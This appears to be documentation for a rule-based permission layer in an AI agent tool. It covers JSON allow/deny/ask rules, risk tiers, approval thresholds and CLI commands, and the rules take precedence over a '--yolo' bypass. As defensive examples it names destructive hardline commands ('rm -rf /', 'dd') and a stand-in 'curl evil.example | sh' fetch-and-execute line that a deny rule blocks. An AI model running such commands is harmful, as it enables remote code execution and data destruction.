---
title: Trust Engine
description: Rule-based allow/deny/ask for tool invocations — an opt-in permission layer that sits before the yolo bypass.
---

# Trust Engine

The trust engine is a rule-based permission layer that sits **before** the pattern-based dangerous-command detector and the `--yolo` bypass. It gives you fine-grained, declarative control over which tool invocations auto-approve, always prompt, or are flat-out forbidden.

**Opt-in by design.** If `~/.hermes/trust.json` doesn't exist, nothing changes — every call returns `no_match` and the existing flow runs unchanged.

Inspired by Vellum Assistant's Trust Rules v3 schema.

## Evaluation order

```
tool invocation
  → hardline floor         ← cannot be overridden (rm -rf /, shutdown, ...)
  → trust engine           ← this doc
    ├── deny rule matched  → blocked (BEATS --yolo)
    ├── allow rule matched → bypass dangerous-pattern check
    ├── ask rule matched   → always prompt, even under --yolo
    └── no_match           → fall through
  → --yolo / session yolo  → allow
  → dangerous-pattern check
  → prompt / auto-approve based on threshold
```

A **deny** rule is a user-expressed invariant — "never let the agent do this, even under yolo." Hardline commands (`rm -rf /`, `dd if=...`, kernel panics) still can't be allowed: those are non-negotiable.

## Rule shape

Rules live in `~/.hermes/trust.json` as a JSON array:

```json
[
  {
    "id": "allow-git-readonly",
    "tool": "terminal",
    "pattern": "git status*",
    "scope": "everywhere",
    "decision": "allow",
    "priority": 100
  },
  {
    "id": "deny-dangerous-pipes",
    "tool": "terminal",
    "pattern": "*curl*|*sh*",
    "decision": "deny",
    "priority": 200
  }
]
```

| Field | Required | Default | Meaning |
|---|---|---|---|
| `id` | yes | — | Unique identifier (alphanumerics + `-`/`_`) |
| `tool` | no | `*` | Tool name the rule applies to. `*` matches any tool. |
| `pattern` | no | `*` | [fnmatch glob](https://docs.python.org/3/library/fnmatch.html) against the candidate string (the shell command for `terminal`, the path for file tools). Case-insensitive fallback. |
| `scope` | no | `everywhere` | Path prefix — only enforced for file tools when a path is provided. |
| `decision` | yes | — | `allow` \| `deny` \| `ask` |
| `priority` | no | `50` | Higher wins; **deny beats allow / ask on ties**. |

## Risk classification

Each invocation is tagged low / medium / high based on the tool:

- **Low** — `file_read`, `search_files`, `glob`, `grep`, `list_directory`, `web_search`, `web_extract`, `web_fetch`, `browser_*_navigate`, and shell commands NOT flagged by the dangerous-pattern detector.
- **Medium** — `file_write`, `patch`, `write_file`, `file_edit`, `host_file_write`, and unclassified tools.
- **High** — shell commands flagged by the existing dangerous-pattern detector.

## Threshold — what auto-approves when no rule matches

```yaml
# config.yaml
approvals:
  auto_approve_up_to: low   # none | low | medium | high
```

| `auto_approve_up_to` | Low | Medium | High |
|---|---|---|---|
| `none` | prompt | prompt | prompt |
| `low` (default) | auto-allow | prompt | prompt |
| `medium` | auto-allow | auto-allow | prompt |
| `high` | auto-allow | auto-allow | auto-allow |

**Deny rules always beat the threshold.** The threshold only applies when no rule matched the invocation.

## CLI

```bash
hermes trust list                    # show all rules, sorted by priority
hermes trust show <rule-id>          # print one rule's full body
hermes trust add --tool terminal \
                 --pattern 'git status*' \
                 --decision allow \
                 --priority 100
hermes trust remove <rule-id>
hermes trust init                    # seed a starter bundle (git-readonly, ls, file_read)

# Debug: what would happen for a specific invocation?
hermes trust why --tool terminal --cmd "git push origin main"
```

`hermes trust why` prints the full explain payload — every matched rule, the winner, the computed risk, the active threshold, and whether the threshold would auto-approve on `no_match`.

## Example policy: "never pipe untrusted scripts into a shell"

```bash
hermes trust add --id deny-curl-sh \
                 --tool terminal \
                 --pattern '*curl*|*sh*' \
                 --decision deny --priority 200
```

Even under `--yolo`, the agent can no longer run `curl evil.example | sh` — the trust engine blocks it before yolo sees it.

## Example policy: low-noise read-only workflows

```bash
hermes trust init
```

Seeds a handful of starter rules allowing `git status`, `git log`, `git diff`, `ls`, `cat`, and the read-only file tools. Review with `hermes trust list` and remove any you don't want.

## Caveats

- The trust engine currently hooks into the `terminal` tool approval path (the one place permission matters most). File-tool integration is planned as a follow-up — the engine will be callable from file-tool wrappers so rules with `tool: file_write` take effect, but today only `terminal` rules are enforced at the approval site.
- Rule `scope` requires the caller to pass a `path` argument. `terminal` doesn't, so `scope` is currently only meaningful once file-tool integration lands.
- The dangerous-pattern detector is still the final gatekeeper when no rule matches — trust rules extend it, they don't replace it.
